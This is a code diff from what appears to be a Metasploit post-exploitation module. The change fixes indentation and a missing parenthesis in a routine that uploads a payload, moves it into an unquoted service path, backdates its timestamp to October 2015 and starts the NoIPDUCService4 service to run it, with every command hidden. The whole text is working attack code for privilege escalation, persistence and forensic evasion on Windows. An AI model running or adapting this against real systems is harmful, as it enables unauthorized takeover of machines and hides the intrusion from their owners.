@@ -217,13 +217,13 @@ def ls_stage1
           client.fs.file.upload("%temp%\\#{bin_shell}","#{local_path}")
           sleep(1.5)
  
-     # move payload to the rigth directory (unquoted service path)
-     r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{bin_shell} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true}
-     # Change payload timestamp (date:time) -> set date to 7:30 am 1st October 2015
-     print_good(" timestamp => #{time_stamp}")
-     r = session.sys.process.execute("cmd.exe /c #{time_stamp} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
-     sleep(1.5)
-     r = session.sys.process.execute("cmd.exe /c sc start NoIPDUCService4", nil, {'Hidden' => true, 'Channelized' => true})
+    # move payload to the rigth directory (unquoted service path)
+    r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{bin_shell} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
+    # Change payload timestamp (date:time) -> set date to 7:30 am 1st October 2015
+    print_good(" timestamp => #{time_stamp}")
+    r = session.sys.process.execute("cmd.exe /c #{time_stamp} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
+    sleep(1.5)
+    r = session.sys.process.execute("cmd.exe /c sc start NoIPDUCService4", nil, {'Hidden' => true, 'Channelized' => true})
 
  
         # task completed successefully...
